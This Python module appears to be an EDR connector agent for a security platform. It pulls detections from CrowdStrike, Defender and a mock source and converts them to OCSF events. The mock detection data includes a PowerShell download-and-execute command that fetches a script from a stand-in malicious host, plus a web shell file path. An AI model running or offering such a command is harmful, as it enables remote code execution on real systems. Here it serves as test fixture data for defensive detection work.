"""
SATRIA AI - EDR Connector Agent
Connects to EDR platforms (CrowdStrike, Microsoft Defender, SentinelOne)
"""

import asyncio
import json
import logging
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
import aiohttp

from satria.core.agent_base import BaseAgent
from satria.core.event_bus import event_bus
from satria.models.events import BaseEvent, EventCategory, EventClass
from satria.core.config import settings


@dataclass
class EDRPlatform:
    """EDR platform configuration"""
    name: str
    platform_type: str  # crowdstrike, defender, sentinelone
    api_endpoint: str
    auth_config: Dict[str, str]
    enabled: bool = True
    polling_interval: int = 30  # seconds


class EDRConnectorAgent(BaseAgent):
    """
    Priority Agent 2: EDR Connector
    Connects to EDR platforms and ingests security events
    """

    def __init__(self):
        super().__init__(
            name="edr_connector",
            description="Connects to EDR platforms for real-time security events",
            version="1.0.0"
        )
        self.edr_platforms: List[EDRPlatform] = []
        self.collection_tasks = {}
        self.events_collected = 0
        self.api_errors = 0
        self.session: Optional[aiohttp.ClientSession] = None

    async def initialize(self) -> bool:
        """Initialize EDR connections"""
        try:
            # Initialize HTTP session
            self.session = aiohttp.ClientSession()

            # Configure EDR platforms from settings
            self.edr_platforms = []

            # CrowdStrike Falcon
            if settings.crowdstrike_client_id and settings.crowdstrike_client_secret:
                self.edr_platforms.append(EDRPlatform(
                    name="crowdstrike",
                    platform_type="crowdstrike",
                    api_endpoint="https://api.crowdstrike.com",
                    auth_config={
                        "client_id": settings.crowdstrike_client_id,
                        "client_secret": settings.crowdstrike_client_secret
                    }
                ))

            # Microsoft Defender for Endpoint
            if settings.defender_tenant_id and settings.defender_client_id:
                self.edr_platforms.append(EDRPlatform(
                    name="defender",
                    platform_type="defender",
                    api_endpoint="https://api.securitycenter.microsoft.com",
                    auth_config={
                        "tenant_id": settings.defender_tenant_id,
                        "client_id": settings.defender_client_id,
                        "client_secret": settings.defender_client_secret
                    }
                ))

            # Mock EDR for demo/development
            self.edr_platforms.append(EDRPlatform(
                name="mock_edr",
                platform_type="mock",
                api_endpoint="http://mock-edr.local",
                auth_config={},
                enabled=True
            ))

            # Start collection tasks
            for platform in self.edr_platforms:
                if platform.enabled:
                    task = asyncio.create_task(self._collect_from_platform(platform))
                    self.collection_tasks[platform.name] = task

            logging.info(f"EDR Connector initialized with {len(self.collection_tasks)} platforms")
            return True

        except Exception as e:
            logging.error(f"Failed to initialize EDR Connector: {e}")
            return False

    async def _collect_from_platform(self, platform: EDRPlatform):
        """Collect events from specific EDR platform"""
        logging.info(f"Starting collection from {platform.name}")

        while self.is_running:
            try:
                if platform.platform_type == "crowdstrike":
                    await self._collect_crowdstrike(platform)
                elif platform.platform_type == "defender":
                    await self._collect_defender(platform)
                elif platform.platform_type == "mock":
                    await self._collect_mock_edr(platform)

                await asyncio.sleep(platform.polling_interval)

            except Exception as e:
                logging.error(f"Error collecting from {platform.name}: {e}")
                self.api_errors += 1
                await asyncio.sleep(60)  # Back off on error

    async def _collect_crowdstrike(self, platform: EDRPlatform):
        """Collect from CrowdStrike Falcon API"""
        try:
            # Get OAuth token
            token = await self._get_crowdstrike_token(platform)
            if not token:
                return

            # Fetch detections
            headers = {"Authorization": f"Bearer {token}"}

            # Mock CrowdStrike detections for demo
            mock_detections = [
                {
                    "detection_id": "ldt:12345",
                    "created_timestamp": datetime.now(timezone.utc).isoformat(),
                    "device": {"hostname": "WORKSTATION-01", "external_ip": "192.168.1.100"},
                    "behaviors": [{
                        "behavior_id": "12345",
                        "filename": "suspicious.exe",
                        "cmdline": "powershell.exe -enc <encoded>",
                        "severity": 70,
                        "tactic": "Defense Evasion",
                        "technique": "Obfuscated Files or Information"
                    }]
                }
            ]

            for detection in mock_detections:
                event = await self._crowdstrike_to_event(detection, platform)
                if event:
                    await event_bus.publish(event)
                    self.events_collected += 1

        except Exception as e:
            logging.error(f"CrowdStrike collection error: {e}")
            self.api_errors += 1

    async def _collect_defender(self, platform: EDRPlatform):
        """Collect from Microsoft Defender API"""
        try:
            # Get access token
            token = await self._get_defender_token(platform)
            if not token:
                return

            # Mock Defender alerts
            mock_alerts = [
                {
                    "id": "alert-123",
                    "createdDateTime": datetime.now(timezone.utc).isoformat(),
                    "title": "Suspicious process execution",
                    "severity": "high",
                    "category": "Execution",
                    "machineId": "machine-456",
                    "computerDnsName": "SERVER-01",
                    "evidence": [{
                        "fileName": "malware.exe",
                        "filePath": "C:\\Temp\\malware.exe"
                    }]
                }
            ]

            for alert in mock_alerts:
                event = await self._defender_to_event(alert, platform)
                if event:
                    await event_bus.publish(event)
                    self.events_collected += 1

        except Exception as e:
            logging.error(f"Defender collection error: {e}")
            self.api_errors += 1

    async def _collect_mock_edr(self, platform: EDRPlatform):
        """Collect from mock EDR (for development/demo)"""
        try:
            # Simulate various EDR detections
            mock_events = [
                {
                    "type": "process_anomaly",
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "host": "WEB-SERVER-01",
                    "process": "powershell.exe",
                    "command": "powershell.exe -ExecutionPolicy Bypass -Command 'IEX((New-Object Net.WebClient).DownloadString(\"http://malicious.com/script.ps1\"))'",
                    "severity": "high",
                    "risk_score": 85
                },
                {
                    "type": "network_connection",
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "host": "WORKSTATION-05",
                    "source_ip": "192.168.1.105",
                    "dest_ip": "185.220.101.182",  # Known Tor exit node
                    "dest_port": 443,
                    "protocol": "https",
                    "severity": "medium",
                    "risk_score": 60
                },
                {
                    "type": "file_modification",
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "host": "FILE-SERVER-01",
                    "file_path": "/var/www/html/wp-content/uploads/shell.php",
                    "operation": "create",
                    "user": "www-data",
                    "severity": "critical",
                    "risk_score": 95
                }
            ]

            for mock_event in mock_events:
                event = await self._mock_edr_to_event(mock_event, platform)
                if event:
                    await event_bus.publish(event)
                    self.events_collected += 1

        except Exception as e:
            logging.error(f"Mock EDR error: {e}")

    async def _get_crowdstrike_token(self, platform: EDRPlatform) -> Optional[str]:
        """Get CrowdStrike OAuth token"""
        # In real implementation, this would make actual OAuth request
        return "mock-crowdstrike-token"

    async def _get_defender_token(self, platform: EDRPlatform) -> Optional[str]:
        """Get Microsoft Defender access token"""
        # In real implementation, this would make actual OAuth request
        return "mock-defender-token"

    async def _crowdstrike_to_event(self, detection: Dict, platform: EDRPlatform) -> Optional[BaseEvent]:
        """Convert CrowdStrike detection to OCSF event"""
        try:
            behavior = detection["behaviors"][0] if detection["behaviors"] else {}
            device = detection["device"]

            event = BaseEvent(
                event_type="edr_detection",
                event_category=EventCategory.FINDINGS,
                event_class=EventClass.DETECTION_FINDING,
                timestamp=datetime.fromisoformat(detection["created_timestamp"]),
                entity_ids={
                    "host": device.get("hostname"),
                    "detection_id": detection["detection_id"]
                },
                message=f"CrowdStrike detection: {behavior.get('tactic', 'Unknown tactic')}",
                risk=behavior.get("severity", 50),
                confidence=0.9,
                enrichment={
                    "platform": platform.name,
                    "edr_platform": "crowdstrike",
                    "detection_id": detection["detection_id"],
                    "filename": behavior.get("filename"),
                    "command_line": behavior.get("cmdline"),
                    "tactic": behavior.get("tactic"),
                    "technique": behavior.get("technique"),
                    "device_info": device
                }
            )

            return event

        except Exception as e:
            logging.error(f"Error converting CrowdStrike detection: {e}")
            return None

    async def _defender_to_event(self, alert: Dict, platform: EDRPlatform) -> Optional[BaseEvent]:
        """Convert Microsoft Defender alert to OCSF event"""
        try:
            severity_map = {"low": 25, "medium": 50, "high": 75, "critical": 95}
            risk_score = severity_map.get(alert.get("severity", "medium"), 50)

            event = BaseEvent(
                event_type="edr_detection",
                event_category=EventCategory.FINDINGS,
                event_class=EventClass.DETECTION_FINDING,
                timestamp=datetime.fromisoformat(alert["createdDateTime"]),
                entity_ids={
                    "host": alert.get("computerDnsName"),
                    "alert_id": alert["id"]
                },
                message=f"Defender alert: {alert['title']}",
                risk=risk_score,
                confidence=0.85,
                enrichment={
                    "platform": platform.name,
                    "edr_platform": "defender",
                    "alert_id": alert["id"],
                    "category": alert.get("category"),
                    "machine_id": alert.get("machineId"),
                    "evidence": alert.get("evidence", [])
                }
            )

            return event

        except Exception as e:
            logging.error(f"Error converting Defender alert: {e}")
            return None

    async def _mock_edr_to_event(self, mock_event: Dict, platform: EDRPlatform) -> Optional[BaseEvent]:
        """Convert mock EDR event to OCSF event"""
        try:
            event_type_map = {
                "process_anomaly": EventClass.PROCESS_ACTIVITY,
                "network_connection": EventClass.NETWORK_TRAFFIC,
                "file_modification": EventClass.FILE_SYSTEM_ACTIVITY
            }

            event = BaseEvent(
                event_type="edr_detection",
                event_category=EventCategory.FINDINGS,
                event_class=event_type_map.get(mock_event["type"], EventClass.DETECTION_FINDING),
                timestamp=datetime.fromisoformat(mock_event["timestamp"]),
                entity_ids={"host": mock_event["host"]},
                message=f"EDR Detection: {mock_event['type']} on {mock_event['host']}",
                risk=mock_event.get("risk_score", 50),
                confidence=0.8,
                enrichment={
                    "platform": platform.name,
                    "edr_platform": "mock",
                    "detection_type": mock_event["type"],
                    "severity": mock_event.get("severity"),
                    **{k: v for k, v in mock_event.items() if k not in ["type", "timestamp", "host", "risk_score"]}
                }
            )

            return event

        except Exception as e:
            logging.error(f"Error converting mock EDR event: {e}")
            return None

    async def process_event(self, event: BaseEvent) -> Optional[BaseEvent]:
        """Process events (not used by connector, but required by base class)"""
        return None

    async def shutdown(self):
        """Shutdown EDR connector"""
        # Cancel collection tasks
        for task in self.collection_tasks.values():
            task.cancel()

        # Close HTTP session
        if self.session:
            await self.session.close()

        await super().shutdown()
        logging.info(f"EDR Connector shutdown. Events collected: {self.events_collected}, API errors: {self.api_errors}")

    async def cleanup(self) -> None:
        """Cleanup resources before shutdown"""
        try:
            # Cancel collection tasks
            for task in self.collection_tasks.values():
                if not task.done():
                    task.cancel()

            # Clear collections
            self.collection_tasks.clear()
            self.event_cache.clear()

            self.logger.info("EDR connector cleanup completed")
        except Exception as e:
            self.logger.error(f"Error during cleanup: {e}")

    def get_metrics(self) -> Dict[str, Any]:
        """Get connector metrics"""
        return {
            **super().get_metrics(),
            "events_collected": self.events_collected,
            "api_errors": self.api_errors,
            "active_platforms": len(self.collection_tasks),
            "configured_platforms": len(self.edr_platforms)
        }


# Global instance
edr_connector = EDRConnectorAgent()